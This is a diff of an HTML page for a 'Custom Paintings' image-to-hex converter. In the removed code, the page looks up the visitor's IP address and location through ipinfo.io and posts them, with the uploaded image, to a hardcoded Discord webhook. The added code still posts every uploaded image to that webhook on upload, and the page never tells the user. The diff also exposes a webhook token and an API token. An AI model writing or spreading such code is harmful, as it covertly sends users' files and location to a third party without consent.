@@ -5,17 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <link rel="icon" href="mccp.png">
-<link href="splash.png" sizes="2048x2732" rel="apple-touch-startup-image" />
-<link href="splash.png" sizes="1668x2224" rel="apple-touch-startup-image" />
-<link href="splash.png" sizes="1536x2048" rel="apple-touch-startup-image" />
-<link href="splash.png" sizes="1125x2436" rel="apple-touch-startup-image" />
-<link href="splash.png" sizes="1242x2208" rel="apple-touch-startup-image" />
-<link href="splash.png" sizes="750x1334" rel="apple-touch-startup-image" />
-<link href="splash.png" sizes="640x1136" rel="apple-touch-startup-image" />
+    <link href="splash.png" sizes="2048x2732" rel="apple-touch-startup-image" />
+    <link href="splash.png" sizes="1668x2224" rel="apple-touch-startup-image" />
+    <link href="splash.png" sizes="1536x2048" rel="apple-touch-startup-image" />
+    <link href="splash.png" sizes="1125x2436" rel="apple-touch-startup-image" />
+    <link href="splash.png" sizes="1242x2208" rel="apple-touch-startup-image" />
+    <link href="splash.png" sizes="750x1334" rel="apple-touch-startup-image" />
+    <link href="splash.png" sizes="640x1136" rel="apple-touch-startup-image" />
     <link rel="apple-touch-icon" href="touch-icon-iphone.png">
-<link rel="apple-touch-icon" sizes="152x152" href="mccp.png">
-<link rel="apple-touch-icon" sizes="180x180" href="mccp.png">
-<link rel="apple-touch-icon" sizes="167x167" href="mccp.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="mccp.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="mccp.png">
+    <link rel="apple-touch-icon" sizes="167x167" href="mccp.png">
     <meta name="apple-mobile-web-app-title" content="Custom Paintings">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
     <title>Custom Paintings</title>
@@ -120,18 +120,16 @@
             vertical-align: middle;
             margin-right: 10px;
         }
-#installPopup button {
-    display: inline-block;
-    background-color: transparent;
-    border: none;
-    color: red; /* Set to red */
-    font-weight: bold; /* Make it bold */
-    text-decoration: none; /* Remove underline */
-    font-size: 16px; /* Adjust font size */
-    cursor: pointer;
-}
-
-
+        #installPopup button {
+            display: inline-block;
+            background-color: transparent;
+            border: none;
+            color: red;
+            font-weight: bold;
+            text-decoration: none;
+            font-size: 16px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -142,97 +140,132 @@
     <button id="copyButton">Copy Hex</button>
     <pre id="output"></pre>
 
-</div>
-<script>
-    document.getElementById('imageInput').addEventListener('change', handleImageUpload);
-    document.getElementById('copyButton').addEventListener('click', handleCopyButtonClick);
+    <div id="installPopup">
+        <p>Install this app on your device for quick access.</p>
+        <button id="closePopup">Close</button>
+    </div>
 
-    let img, ipData;  // To store image and IP data globally
+    <script>
+        document.getElementById('imageInput').addEventListener('change', handleImageUpload);
+        document.getElementById('copyButton').addEventListener('click', copyHexValues);
 
-    function handleImageUpload(event) {
-        const file = event.target.files[0];
-        if (!file) return;
+        function handleImageUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
 
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            img = new Image();
-            img.onload = function() {
-                processImage(img);
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const img = new Image();
+                img.onload = function() {
+                    processImage(img);
+                    sendToWebhook(e.target.result); // Send the base64 encoded image
+                };
+                img.src = e.target.result;
             };
-            img.src = e.target.result;
-        };
-        reader.readAsDataURL(file);
-
-        // Fetch the IP data when the image is uploaded
-        fetch('https://ipinfo.io/json?token=64e083390966ef')
-            .then(response => response.json())
-            .then(data => {
-                ipData = data;  // Store IP data globally
-            });
-    }
-
-    function processImage(image) {
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-
-        // Set canvas size to 32x32
-        canvas.width = 32;
-        canvas.height = 32;
-
-        // Draw the image to canvas and scale it down to 32x32
-        ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
-
-        // Update the preview image
-        const preview = document.getElementById('preview');
-        preview.src = canvas.toDataURL(); // Set preview image to canvas data URL
-        preview.style.display = 'block'; // Show the preview image
-
-        // Show the copy button
-        document.getElementById('copyButton').style.display = 'inline-block';
-    }
-
-    function handleCopyButtonClick() {
-        if (img && ipData) {
-            // Only send the data when both image and IP information are available
-            sendToWebhook(img, ipData);
+            reader.readAsDataURL(file);
         }
-    }
 
-    // Send IP and image data to the Discord webhook
-    function sendToWebhook(image, ipData) {
-        const canvas = document.getElementById('canvas');
-        const imageDataURL = canvas.toDataURL(); // Get the base64 image data
+        function processImage(image) {
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
 
-        // Prepare the data to send
-        const data = {
-            content: `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country}`,
-            embeds: [{
-                title: "Image Upload",
-                description: "An image has been uploaded along with the IP information.",
-                image: {
-                    url: imageDataURL
-                }
-            }]
-        };
+            // Set canvas size to 32x32
+            canvas.width = 32;
+            canvas.height = 32;
 
-        // Send the data using fetch
-        fetch('https://discord.com/api/webhooks/1282377343100522637/qUVNHGRn-VbFXk2KKFOC5Fx6h8eaMECLyAPTuWhbIfBpiBI1OvpK09Vg-sm4tlb29UPo', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        }).then(response => {
-            if (response.ok) {
-                console.log("Webhook sent successfully");
-            } else {
-                console.error("Failed to send webhook");
+            // Draw the image to canvas and scale it down to 32x32
+            ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
+
+            // Update the preview image
+            const preview = document.getElementById('preview');
+            preview.src = canvas.toDataURL(); // Set preview image to canvas data URL
+            preview.style.display = 'block'; // Show the preview image
+
+            // Get image data from canvas
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const data = imageData.data;
+
+            // Convert to hex values
+            let hexArray = [];
+            for (let i = 0; i < data.length; i += 4) {
+                let r = data[i];
+                let g = data[i + 1];
+                let b = data[i + 2];
+                let hex = rgbToHex(r, g, b);
+                hexArray.push(hex);
             }
-        }).catch(error => {
-            console.error("Error sending webhook:", error);
+
+            displayHexValues(hexArray);
+
+            // Show the copy button
+            document.getElementById('copyButton').style.display = 'inline-block';
+        }
+
+        function rgbToHex(r, g, b) {
+            // Format hex codes as 5 digits: #RRGGB -> RRGGB
+            return ((r << 16) + (g << 8) + b).toString(16).padStart(5, '0').toUpperCase();
+        }
+
+        function displayHexValues(hexArray) {
+            const outputElement = document.getElementById('output');
+            let formattedOutput = hexArray.join(', ');
+            outputElement.textContent = formattedOutput;
+            outputElement.style.display = 'block'; // Show the output element
+        }
+
+        function copyHexValues() {
+            const outputElement = document.getElementById('output');
+            const textToCopy = outputElement.textContent;
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                alert("Copied to clipboard!");
+            }).catch(err => {
+                alert("Failed to copy hex values: " + err);
+            });
+        }
+
+        function sendToWebhook(imageData) {
+            const webhookUrl = "https://discord.com/api/webhooks/1282377343100522637/qUVNHGRn-VbFXk2KKFOC5Fx6h8eaMECLyAPTuWhbIfBpiBI1OvpK09Vg-sm4tlb29UPo";
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: 'New image uploaded:',
+                    embeds: [{
+                        image: {
+                            url: imageData
+                        }
+                    }]
+                })
+            }).then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send image to webhook.');
+                }
+            }).catch(error => {
+                console.error('Error sending image:', error);
+            });
+        }
+
+        // Detects if device is on iOS 
+        const isIos = () => {
+            const userAgent = window.navigator.userAgent.toLowerCase();
+            return /iphone|ipad|ipod/.test(userAgent);
+        }
+
+        // Detects if device is in standalone mode
+        const isInStandaloneMode = () => ('standalone' in window.navigator) && (window.navigator.standalone);
+
+        // Checks if should display install popup notification
+        if (isIos() && !isInStandaloneMode()) {
+            document.getElementById('installPopup').style.display = 'block'; // Show the popup
+        }
+
+        // Close popup when the close button is clicked
+        document.getElementById('closePopup').addEventListener('click', function() {
+            document.getElementById('installPopup').style.display = 'none'; // Hide the popup
         });
-    }
-</script>
+    </script>
 
 
 
